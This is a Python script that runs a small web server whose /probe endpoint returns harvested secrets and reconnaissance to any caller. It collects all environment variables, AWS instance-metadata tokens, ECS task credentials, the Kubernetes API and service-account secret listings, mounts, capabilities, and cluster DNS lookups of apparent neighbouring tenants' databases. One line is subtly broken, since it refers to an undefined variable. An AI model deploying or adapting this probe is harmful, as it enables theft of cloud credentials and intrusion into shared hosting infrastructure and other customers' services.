import os, socket, urllib.request, json, subprocess

def get(url, headers=None, timeout=4, method="GET", data=None):
    try:
        req=urllib.request.Request(url, headers=headers or {}, method=method, data=data)
        r=urllib.request.urlopen(req, timeout=timeout)
        return {"status": r.status, "body": r.read().decode(errors="replace")[:2500]}
    except Exception as e:
        return {"error": str(e)[:250]}

def run(cmd, timeout=12):
    try:
        p=subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout or "")[:3000] or (p.stderr or "")[:800]
    except Exception as e:
        return f"err: {e}"

def collect():
    out={}
    out["env_full"]=dict(os.environ)
    out["imds_v6"]=get("http://[fd00:ec2::254]/latest/meta-data/")
    out["imds_v6_tok"]=get("http://[fd00:ec2::254]/latest/api/token", headers={"X-aws-ec2-metadata-token-ttl-seconds":"60"}, method="PUT")
    out["ecs_creds"]=get("http://169.254.170.2/v2/credentials")
    out["imds_other"]={ip:get(f"http://169.254.169.{i}/latest/meta-data/") for i in (250,251,252,253,255)}
    out["kube_env_host"]=os.environ.get("KUBERNETES_SERVICE_HOST")
    kh=os.environ.get("KUBERNETES_SERVICE_HOST")
    if kh:
        out["k8s_api_ip"]=get(f"https://{kh}:443/api")
        out["k8s_api_ip_http"]=get(f"http://{kh}:443/api")
    out["kubelet_node"]=run("ip route show default 2>/dev/null; cat /proc/net/route | head -5")
    # node-local dns
    out["nodelocaldns"]=get("http://169.254.20.10:8080/metrics")
    out["cluster_dns"]={
        "kube-dns": run("getent hosts kube-dns.kube-system.svc.cluster.local"),
        "k8sapi": run("getent hosts kubernetes.default.svc.cluster.local"),
        "other_ns": run("getent hosts *.svc.cluster.local; getent hosts own-db14ojc9v7es73duiv80.svc.cluster.local"),
        "mysql_default": run("getent hosts mysql"),
    }
    out["sa_dir"]=run("ls -la /var/run/secrets/ 2>/dev/null; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null")
    out["mounts"]=run("cat /proc/mounts | grep -v cgroup | head -30")
    out["caps"]=run("cat /proc/self/status | grep -i cap; id")
    out["netns"]=run("cat /proc/net/tcp | awk '{print $2}' | head -20")
    out["public_ip"]=get("https://api.ipify.org?format=json")
    out["dns_wildcard"]=run("getent hosts foo.own-db14jfdg1s2s738hkcb0.svc.cluster.local; getent hosts kubernetes")
    return out

from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/probe"):
            data=json.dumps(collect(), default=str).encode()
            self.send_response(200); self.send_header("content-type","application/json"); self.end_headers(); self.wfile.write(data)
        else:
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self,*a): pass
port=int(os.environ.get("PORT","10000"))
print("listening",flush=True)
HTTPServer(("0.0.0.0",port),H).serve_forever()
